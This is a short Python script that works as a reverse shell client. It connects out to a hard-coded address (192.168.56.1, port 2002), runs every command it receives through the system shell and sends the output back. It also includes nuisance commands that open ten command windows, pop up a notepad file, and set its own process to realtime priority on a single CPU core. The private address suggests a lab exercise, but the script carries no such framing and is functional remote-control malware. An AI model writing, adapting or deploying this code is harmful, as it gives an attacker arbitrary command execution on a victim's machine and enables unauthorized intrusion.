import socket
import subprocess
import psutil
import os
import sys


IP = '192.168.56.1'
PORT = 2002

with socket.socket() as s:
    s.connect((IP, PORT))
    
    while True:
        try:
            command = s.recv(4096).decode()
            if command == 'spam':
                for _ in range(10):
                    subprocess.Popen('start cmd', shell=True)

            elif command == 'note':
                subprocess.Popen(f'echo Connected on port {PORT} > fichier.txt && start notepad fichier.txt', shell=True)

            elif command == 'slow':
                p = psutil.Process(os.getpid())
                p.nice(psutil.REALTIME_PRIORITY_CLASS)
                p.cpu_affinity([0])
            
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = output.stdout + output.stderr

            if not output:
                output = "[INFO] NO OUTPUT"
            s.send(output.encode())

        except KeyboardInterrupt:
            print("\n[DISCONNECTED]")
            break
        except socket.error as e:
            print(f"[ERROR]: {e}")
            break
